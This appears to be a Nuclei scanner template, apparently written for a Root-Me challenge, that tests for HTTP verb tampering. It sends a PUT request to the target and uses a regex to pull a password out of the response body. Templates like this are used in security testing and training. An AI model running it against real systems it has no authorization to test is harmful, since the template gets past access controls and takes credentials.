id: HTTP-VerbTampering
info:
  author: Tomitom13
  name: HTTP Verb Tampering
  severity: unknown
  tags: verb,tampering,http,rootme
requests:
- extractors:
  - name: password
    part: body
    regex:
    - 'password : [a-zA-Z0-9!@#$%^&*()_+,.<>?]+'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - '/ password : '
  matchers-condition: and
  method: PUT
  path:
  - '{{BaseURL}}'
